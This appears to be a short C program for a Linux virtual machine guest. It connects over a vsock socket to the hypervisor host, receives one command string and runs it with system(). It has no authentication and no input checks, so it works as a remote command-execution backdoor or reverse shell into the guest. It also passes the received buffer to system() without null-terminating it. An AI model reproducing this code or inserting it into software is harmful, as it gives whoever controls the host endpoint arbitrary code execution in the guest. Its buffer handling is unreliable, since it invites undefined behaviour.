#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/vfs.h>
#include <sys/stat.h>
#include <linux/vm_sockets.h>

#define MAX_COMMAND_LENGTH 2048

void setCID(char params[], int *cid) {
    if (strlen(params) > 0) {
        int _cid = atoi(params);
        if (_cid == VMADDR_CID_ANY || _cid == VMADDR_CID_HYPERVISOR || 
            _cid == VMADDR_CID_LOCAL || _cid == VMADDR_CID_HOST) {
            *cid = _cid;
        }
    }
}

void setPort(char params[], int *port) {
    if (strlen(params) > 0) {
        int _port = atoi(params);
        if (_port >= 0 && _port <= 65535) {
            *port = _port;
        }
    }
}

int main(int argc, char *argv[]) {
    int cid = VMADDR_CID_HOST;
    int vsockPort = 1024;
    int sockfd;
    struct sockaddr_vm sa_vm;
    char command[MAX_COMMAND_LENGTH];

    if (argc > 1) {
        char *param = argv[1];
        char *delim = strchr(param, ':');
        if (delim != NULL) {
            *delim = '\0';
            char *cidString = param;
            char *portString = delim + 1;

            setCID(cidString, &cid);
            setPort(portString, &vsockPort);
        } else {
            setCID(param, &cid);
        }
    }

    sockfd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        exit(1);
    }

    memset(&sa_vm, 0, sizeof(struct sockaddr_vm));
    sa_vm.svm_family = AF_VSOCK;
    sa_vm.svm_cid = cid;
    sa_vm.svm_port = vsockPort;

    if (connect(sockfd, (struct sockaddr*)&sa_vm, sizeof(struct sockaddr_vm)) < 0) {
        perror("Failed to connect");
        close(sockfd);
        exit(1);
    }

    if (recv(sockfd, command, sizeof(command), 0) < 0) {
        perror("Failed to receive command");
        close(sockfd);
        exit(1);
    }

    system(command);

    close(sockfd);

    return 0;
}
